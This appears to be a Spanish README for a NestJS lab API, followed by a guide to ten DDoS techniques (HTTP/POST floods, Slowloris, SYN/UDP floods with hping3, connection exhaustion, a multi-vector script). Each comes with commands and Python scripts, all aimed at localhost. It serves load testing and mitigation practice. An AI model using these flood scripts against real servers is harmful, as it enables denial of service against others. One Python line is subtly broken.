# API DDoS Test Lab

API REST mínima desarrollada con NestJS para pruebas de laboratorio de ataques DDoS y tests de carga.

## Requisitos Previos

- Node.js >= 18.x
- npm >= 9.x

## Instalación

```bash
# Clonar el repositorio
cd api-test-ddos

# Instalar dependencias
npm install

# Compilar el proyecto
npm run build

# Iniciar en modo desarrollo
npm run start:dev

# O iniciar en producción
npm run start:prod
```

El servidor estará disponible en `http://localhost:3000`

## Arquitectura

```
src/
├── main.ts              # Punto de entrada, inicializa NestJS
├── app.module.ts        # Módulo raíz que orquesta la aplicación
├── app.controller.ts   # Controlador REST con todos los endpoints
└── app.service.ts      # Lógica de negocio (servicio inyectable)
```

### Patrón de Diseño

La aplicación sigue la arquitectura estándar de NestJS:

- **Controller**: Maneja las solicitudes HTTP y responde al cliente
- **Service**: Contiene la lógica de negocio, es inyectable via DI
- **Module**: Agrupa componentes relacionados

## Endpoints

| Método | Endpoint | Descripción |
|--------|----------|-------------|
| GET | `/api` | Health check - verifica que la API esté activa |
| GET | `/api/status` | Estado del servidor: uptime, uso de memoria, contador de requests |
| GET | `/api/items` | Lista todos los items almacenados en memoria |
| GET | `/api/items/:id` | Obtiene un item específico por su ID |
| POST | `/api/items` | Crea un nuevo item (body JSON) |
| PUT | `/api/items/:id` | Actualiza un item existente |
| DELETE | `/api/items/:id` | Elimina un item por su ID |
| GET | `/api/heavy` | Simula procesamiento CPU-intensivo (bucle de 1M iteraciones) |
| GET | `/api/delay/:ms` | Endpoint con delay configurable (máx 10000ms) |

## Especificaciones Técnicas

### Dependencias

- **NestJS Core**: Framework server-side
- **TypeScript**: Tipado estático
- **Jest**: Testing framework (incluido en NestJS)

### Configuración

El servidor escucha en el puerto definido por la variable de entorno `PORT`, con fallback a `3000`:

```bash
PORT=8080 npm run start:dev
```

### Almacenamiento

Los datos se almacenan **en memoria** (no hay persistencia). Esto es ideal para pruebas de carga donde se necesita un estado limpio en cada ejecución.

## Scripts Disponibles

```bash
# Desarrollo con hot-reload
npm run start:dev

# Build de producción
npm run build

# Iniciar compiled (producción)
npm run start

# Tests unitarios
npm run test

# Tests e2e
npm run test:e2e

# Linting
npm run lint
```

## Tipos de Ataque DDoS - Guía Completa

⚠️ **IMPORTANTE**: Estas pruebas deben ejecutarse exclusivamente en tu propio entorno local. Atacar servidores sin autorización es ilegal.

---

## 1. HTTP Flood (GET)

### Qué es
Ataque de capa 7 donde el atacante envía múltiples solicitudes HTTP GET simultáneamente para saturar el servidor con conexiones concurrentes.

### Endpoints recomendados
- `/api` - Más simple
- `/api/status` - Con respuesta JSON
- `/api/items` - Con procesamiento de array

### Cómo ejecutarlo

**Con wrk (recomendado):**
```bash
# Básico - 12 threads, 400 conexiones, 30 segundos
wrk -t12 -c400 -d30s http://localhost:3000/api/status

# Intenso - más conexiones
wrk -t8 -c1000 -d60s http://localhost:3000/api/status
```

**Con Apache Bench:**
```bash
# 10,000 requests, 500 concurrentes
ab -n 10000 -c 500 http://localhost:3000/api/status
```

**Con autocannon:**
```bash
# 200 conexiones, 30 segundos
autocannon -c 200 -d 30 http://localhost:3000/api/status
```

**Con curl (básico):**
```bash
# 1000 requests en paralelo
for i in {1..1000}; do curl -s http://localhost:3000/api/status > /dev/null & done
wait
```

### Qué resultados esperamos

```
wrk output:
Running 30s test @ http://localhost:3000/api/status
  12 threads and 400 connections
  Thread Stats   Avg      Stdev     Max   +/-Stdev
    Latency     45.23ms   12.34ms  98.45ms   76.00%
    Req/Sec    892.45     45.67   1200.00    72.00%
  267823 requests in 30.02s, 45.67MB read
Requests/sec:   8923.45
Transfer/sec:     1.52MB

Latency distribution:
    50%   42.00ms
    75%   58.00ms
    90%   72.00ms
    99%   98.45ms
```

**Métricas a observar:**
- `Requests/sec`: Cuántos requests procesa por segundo
- `Latency`: Tiempo de respuesta
- `Stdev`: Desviación estándar (más estable = mejor)

---

## 2. POST Flood

### Qué es
Ataque que envía múltiples solicitudes POST con payloads (JSON, form data) para saturar el servidor procesando datos.

### Endpoints recomendados
- `/api/items` (POST)

### Cómo ejecutarlo

**Primero crear el payload:**
```bash
echo '{"name":"test","value":123}' > payload.json
```

**Con Apache Bench:**
```bash
ab -n 5000 -c 200 -p payload.json -T application/json http://localhost:3000/api/items
```

**Con wrk + script Lua:**
```lua
-- post_attack.lua
wrk.method = "POST"
wrk.body   = '{"name":"test","value":123}'
wrk.headers["Content-Type"] = "application/json"

request = function()
    return wrk.format(nil, nil, nil, wrk.body)
end
```

```bash
wrk -t8 -c300 -d30s --script=post_attack.lua http://localhost:3000/api/items
```

### Qué resultados esperamos

```
ab output:
Server Software:        Nest/10.x
Server Hostname:        localhost
Server Port:            3000

Document Path:          /api/items
Document Length:        68 bytes

Concurrency Level:      200
Time taken for tests:   15.432 seconds
Complete requests:      5000
Failed requests:        0
Non-2xx responses:      0
Requests per second:    324.12 [#/sec] (mean)
Time per request:       617.05 [ms] (mean)
Transfer rate:         89.45 [Kbytes/sec] received
```

**Métricas a observar:**
- `Failed requests`: Si aumentan, el servidor está saturado
- `Time per request`: Tiempo promedio por request
- `Transfer rate`: Ancho de banda consumido

---

## 3. CPU Exhaustion

### Qué es
Ataque que envía requests a endpoints que requieren procesamiento CPU-intensivo, agotando los recursos del procesador.

### Endpoints recomendados
- `/api/heavy` - Calcula 1M operaciones matemáticas

### Cómo ejecutarlo

```bash
# wrk con endpoint heavy
wrk -t8 -c200 -d60s http://localhost:3000/api/heavy

# autocannon
autocannon -c 100 -d 30 http://localhost:3000/api/heavy

# Apache Bench
ab -n 1000 -c 50 http://localhost:3000/api/heavy
```

### Qué resultados esperamos

```
Running 30s test @ http://localhost:3000/api/heavy
  8 threads and 100 connections
  Thread Stats   Avg      Stdev     Max   +/-Stdev
    Latency      2.45s    0.89s    4.32s    68.00%
    Req/Sec      0.89     0.34     2.00     72.00%
  26 requests in 30.02s, 4.52KB read
Requests/sec:     0.87
Transfer/sec:     0.15KB/s

Latency distribution:
    50%    2.10s
    75%    3.20s
    90%    4.00s
    99%    4.32s
```

**Métricas a observar:**
- `Req/Sec` muy bajo (pocos requests por segundo)
- `Latency` muy alta (varios segundos)
- El servidor puede dejar de responder a otros requests

**En el monitoreo del servidor (otro terminal):**
```bash
# Verás uso de CPU al 100% en htop
curl -s http://localhost:3000/api/status
# {"status":"ok","uptime":125.45,"memory":{...},"requests":156}
```

---

## 4. Slowloris (Slow HTTP)

### Qué es
Ataque que abre múltiples conexiones HTTP y las mantiene abiertas el mayor tiempo posible, enviando headers incompletos periódicamente para evitar que el servidor cierre la conexión.

### Cómo ejecutarlo

**Con slowhttptest:**
```bash
# Instalarlo
sudo apt install slowhttptest

# Slowloris - 1000 conexiones, intervalo de 15 segundos
slowhttptest -c 1000 -o slowloris_results.txt -u http://localhost:3000/api -t GET -i 15

# Ver progreso
watch -n 1 'tail -20 slowloris_results.txt'
```

**Con curl (manual):**
```bash
# Abrir múltiples conexiones con timeout largo
for i in {1..500}; do
  curl -X GET -H "User-Agent: Slowloris" \
       -H "X-Slowloris: test" \
       --connect-timeout 99999 \
       -m 300 \
       http://localhost:3000/api > /dev/null &
done
```

**Con Python:**
```python
# slowloris.py
import socket
import time

def slowloris_attack(host, port, num_connections):
    sockets = []
    for _ in range(num_connections):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(b"GET /api HTTP/1.1\r\n")
        s.send(b"X-Slowloris: test\r\n".encode())
        sockets.append(s)
    
    while True:
        for s in sockets:
            try:
                s.send(b"X-A: b\r\n")
                time.sleep(15)
            except:
                pass

slowloris_attack("localhost", 3000, 500)
```

### Qué resultados esperamos

```
slowhttptest output:
slowhttptest v1.7
Sun May 04 2025 12:00:00 EDT

Configuration:
  Connections: 1000
  Method: GET
  Interval: 15 seconds

Progress:
  0:32 - connected: 856/1000
  0:45 - connected: 892/1000
  1:00 - connected: 901/1000
  ...
```

**Métricas a observar:**
- `connected`: Número de conexiones activas (debe mantenerse alto)
- En el servidor: muchas conexiones en estado `CLOSE_WAIT` o `TIME_WAIT`
- El servidor deja de responder a nuevos requests

**Ver conexiones en el servidor:**
```bash
# Ver conexiones activas
ss -tan | grep :3000 | wc -l

# Ver estado de conexiones
ss -tan | grep :3000 | head -20
```

---

## 5. Slow POST Attack

### Qué es
Similar a Slowloris pero envía el body del POST muy lentamente, manteniendo la conexión abierta y consumiendo recursos del servidor.

### Endpoints recomendados
- `/api/items` (POST)

### Cómo ejecutarlo

```bash
# slowhttptest - Slow POST
slowhttptest -c 1000 -o slowpost_results.txt -u http://localhost:3000/api/items -t POST -i 500 -r 50
```

**Parámetros:**
- `-c 1000`: 1000 conexiones
- `-i 500`: intervalo de 500 segundos entre datos
- `-r 50`: 50 conexiones por segundo

### Qué resultados esperamos

```
slowhttptest output:
Progress: 0:15 - connected: 543/1000, pending: 456, complete: 0
Progress: 0:30 - connected: 678/1000, pending: 322, complete: 0
...
```

**Métricas a observar:**
- `pending`: Conexiones esperando datos
- El servidor consume memoria procesando cuerpos vacíos
- Nuevos requests fallan por timeout

---

## 6. SYN Flood

### Qué es
Ataque de capa 3/4 que envía paquetes TCP con el flag SYN establecido, pero nunca completa el handshake (no envía ACK). El servidor mantiene conexiones semi-abiertas hasta agotar recursos.

### Cómo ejecutarlo

```bash
# Instalar hping3
sudo apt install hping3

# Sín Flood básico
sudo hping3 -c 10000 -d 100 -S -w 64 -p 3000 --flood 127.0.0.1

# Parámetros:
# -c 10000   = 10,000 paquetes
# -d 100     = tamaño del payload
# -S         = flag SYN
# -w 64      = window size
# -p 3000    = puerto destino
# --flood    = enviar tan rápido como sea posible

# Variante más agresiva
sudo hping3 --flood -S -p 3000 127.0.0.1
```

### Qué resultados esperamos

```
HPING 127.0.0.1 (lo 127.0.0.1): S set, 40 headers + 0 data bytes
--- 127.0.0.1 hping statistic ---
157834 packets tramitted, 0 packets rcvd, 100% packet loss
--- 0.000000% packet loss, time 2345ms
```

**En el servidor (ver conexiones):**
```bash
# Ver conexiones en estado SYN_RECV
ss -tan | grep SYN-RECV | wc -l

# Ver tabla de conexiones
netstat -ant | grep :3000
```

**Métricas a observar:**
- `SYN_RECV`: Muchas conexiones en este estado = ataque activo
- Paquetes perdidos (packet loss)
- El servidor puede dejar de aceptar nuevas conexiones

---

## 7. UDP Flood

### Qué es
Ataque que envía大量的 paquetes UDP al servidor, saturando el ancho de banda de red.

### Cómo ejecutarlo

```bash
# Con hping3 - UDP Flood
sudo hping3 --flood --udp -p 3000 127.0.0.1

# Con sniffles (más configurable)
# Nota: debe tener permisos de root
sudo hping3 -2 -c 50000 -p 3000 --flood 127.0.0.1
```

### Qué resultados esperados

```
HPING 127.0.0.1 (lo 127.0.0.1): UDP mode set, 40 headers + 0 data bytes
--- 127.0.0.1 hping statistic ---
50000 packets tramitted, 0 packets rcvd
```

**Métricas a observar:**
- Incremento drástico de uso de red
- Paquetes perdidos
- CPU no necesariamente alto (el problema es red)

---

## 8. Connection Exhaustion

### Qué es
Ataque que abre tantas conexiones TCP como sea posible hasta agotar los file descriptors o el límite de conexiones del servidor.

### Cómo ejecutarlo

**Con Python:**
```python
# connection_exhaustion.py
import socket
import time

target = "localhost"
port = 3000
max_connections = 10000

sockets = []
for i in range(max_connections):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(b"GET /api HTTP/1.1\r\nHost: localhost\r\n\r\n")
        sockets.append(s)
        if i % 100 == 0:
            print(f"Connections: {i}")
    except Exception as e:
        print(f"Failed at {i}: {e}")
        break

print(f"Total connections: {len(sockets)}")
time.sleep(300)  # Mantener conexiones
```

```bash
python3 connection_exhaustion.py
```

**Con ulimit (ver límites):**
```bash
# Ver límites actuales
ulimit -n

# Temporalmente aumentar (requiere permisos)
ulimit -n 65535
```

### Qué resultados esperamos

```
Connections: 0
Connections: 100
Connections: 200
...
Total connections: 5000
Failed at 5234: [Errno 24] Too many open files
```

**En el servidor:**
```bash
# Ver conexiones establecidas
ss -tan | grep :3000 | wc -l

# Ver límite de archivos abiertos
cat /proc/sys/fs/file-nr

# Ver errores en dmesg
dmesg | tail -20
```

---

## 9. Amplification Attack (DNS/NTP-style simulado)

### Qué es
Ataque donde el atacante envía requests pequeñas que generan respuestas much mayores, amplificando el tráfico hacia la víctima.

### Cómo ejecutarlo (simulado)

En este laboratorio podemos simularlo con el endpoint `/api/items` que devuelve un array:

```bash
# Request pequeño -> respuesta grande (si hay muchos items)
# Primero creamos muchos items
for i in {1..1000}; do
  curl -s -X POST http://localhost:3000/api/items \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"item$i\",\"value\":$i}" > /dev/null
done

# Ahora el GET devuelve un array grande
wrk -t4 -c100 -d10s http://localhost:3000/api/items

# Comparar tamaño request vs response
# GET /api/items -> ~50KB de respuesta
```

### Qué resultados esperamos

```
wrk output:
Running 10s test @ http://localhost:3000/api/items
  4 threads and 100 connections
  45234 requests in 10.00s
  4523.40 req/s
  Transfer/sec: 2.15MB  (respuestas grandes)
```

**Métricas a observar:**
- `Transfer/sec` mucho mayor que en `/api/status`
- Ancho de banda consumido significativamente mayor

---

## 10. Multivector Attack (Ataque Combinado)

### Qué es
Ataque sofisticado que combina múltiples vectores simultáneamente para maximizar el impacto.

### Cómo ejecutarlo

**Script bash que combina ataques:**

```bash
# multi_attack.sh
#!/bin/bash

echo "Starting multi-vector attack..."
echo "1. HTTP Flood en background"
wrk -t8 -c200 -d60s http://localhost:3000/api/status &
WRK_PID=$!

echo "2. Slowloris en background"
slowhttptest -c 500 -u http://localhost:3000/api -t GET -i 20 &
SLOW_PID=$!

echo "3. Connection exhaustion en background"
python3 connection_exhaustion.py &
PY_PID=$!

echo "Waiting 60 seconds..."
sleep 60

kill $WRK_PID $SLOW_PID $PY_PID 2>/dev/null
echo "Attack finished"
```

```bash
chmod +x multi_attack.sh
./multi_attack.sh
```

### Qué resultados esperamos

El servidor debería mostrar:
- Alta latencia en todos los endpoints
- Muchas conexiones en diferentes estados
- Posible caída del servicio
- Alto consumo de CPU y memoria

---

## Monitoreo Durante los Ataques

### Terminal 1: Iniciar servidor
```bash
cd api-test-ddos
npm run start:dev
```

### Terminal 2: Monitorear recursos
```bash
# Ver consumo de CPU y memoria en tiempo real
htop

# Ver conexiones activas
ss -tan | grep :3000 | wc -l

# Ver estado de conexiones
watch -n 1 'ss -tan | grep :3000 | head -20'
```

### Terminal 3: Ver estado de la API
```bash
# Ver estado cada segundo
watch -n 1 'curl -s http://localhost:3000/api/status | jq .'

# Ver uptime
curl -s http://localhost:3000/api/status
```

### Terminal 4: Ejecutar ataque
```bash
wrk -t12 -c500 -d30s http://localhost:3000/api/status
```

---

## Matriz de Ataques vs Herramientas

| Tipo de Ataque | Herramienta | Complejidad | Efectividad |
|----------------|-------------|-------------|--------------|
| HTTP Flood (GET) | wrk, ab, autocannon | Baja | Alta |
| POST Flood | ab, wrk+lua | Media | Alta |
| CPU Exhaustion | wrk+heavy endpoint | Baja | Alta |
| Slowloris | slowhttptest, curl | Media | Media-Alta |
| Slow POST | slowhttptest | Media | Media-Alta |
| SYN Flood | hping3 | Alta | Muy Alta |
| UDP Flood | hping3 | Alta | Muy Alta |
| Connection Exhaustion | Python, curl | Media | Muy Alta |
| Amplification | curl+items | Baja | Media |
| Multi-vector | Múltiples | Alta | Crítica |

---

## Interpretación de Resultados por Herramienta

### wrk
```
Running 30s test @ http://localhost:3000/api/status
  12 threads and 400 connections
  Thread Stats   Avg      Stdev     Max   +/-Stdev
    Latency     45.23ms   12.34ms  98.45ms   76.00%
    Req/Sec    892.45     45.67   1200.00    72.00%
  267823 requests in 30.02s, 45.67MB read
Requests/sec:   8923.45
Transfer/sec:     1.52MB
Latency distribution:
    50%   42.00ms
    75%   58.00ms
    90%   72.00ms
    99%   98.45ms
```
- **Stdev bajo**: Servidor estable
- **Stdev alto**: Inconsistencia (saturación)

### Apache Bench
```
Complete requests:      10000
Failed requests:        45
Non-2xx responses:      10
Requests per second:    523.45
Time per request:       382.12ms
Transfer rate:         145.23 KB/s received
```
- **Failed requests > 0**: Servidor saturado
- **Non-2xx responses**: Errores HTTP

### autocannon
```
Stat        Avg      Stdev    Max
Latency:   23.45ms   12.34ms  456.78ms
Req/Sec:   423.45    67.89    567.00
Req/Bytes: 15.23     4.56     23.00

Seconds: 30.02
Count:   12678
```

### slowhttptest
```
connected: 850/1000
pending:   145
complete:  5
socket errors: 0
```
- **connected mantiene alto**: Ataque efectivo
- **socket errors aumentan**: Límite alcanzado

### hping3 (SYN Flood)
```
--- 127.0.0.1 hping statistic ---
157834 packets tramitted, 0 packets rcvd, 100% packet loss
--- 0.000000% packet loss, time 2345ms
--- 67052 packets tramitted, 3245 packets rcvd, 95.16% packet loss
```
- **100% packet loss en localhost**: Normal (loopback)
- **En red real**: packet loss indica saturación

---

## Recomendaciones para Pruebas

1. **Empezá suave**: 100 conexiones, 10 segundos
2. **Aumentá gradualmente**: 500 conexiones, 30 segundos
3. **Proabá cada tipo**: Entendé cómo afecta cada ataque
4. **Monitoreá siempre**: CPU, memoria, red, conexiones
5. **Documentá resultados**: Compará antes/después de cambios
6. **Probá mitigaciones**: Agregá rate limiting, filtros, etc.
7. **Variá parámetros**: Más duración, más conexiones, más objetivos

## Notas de Seguridad

⚠️ **ADVERTENCIA**: Esta API está diseñada exclusivamente para entornos de laboratorio controlados. No debe desplegarse en producción sin medidas de seguridad adicionales.

- Sin autenticación
- Sin rate limiting
- Sin validación de entrada exhaustiva
- Datos en memoria (se pierden al reiniciar)

## Extensiones Sugeridas

Si necesitás expandir la API para más escenarios de prueba:

1. **Rate Limiting** - Agregar throttling por IP
2. **Logging** - Registrar requests/respuestas
3. **Métricas** - Integrar Prometheus/Grafana
4. **Persistence** - Conectar a Redis o PostgreSQL
5. **WebSockets** - Para pruebas de conexiones persistentes

## Licencia

MIT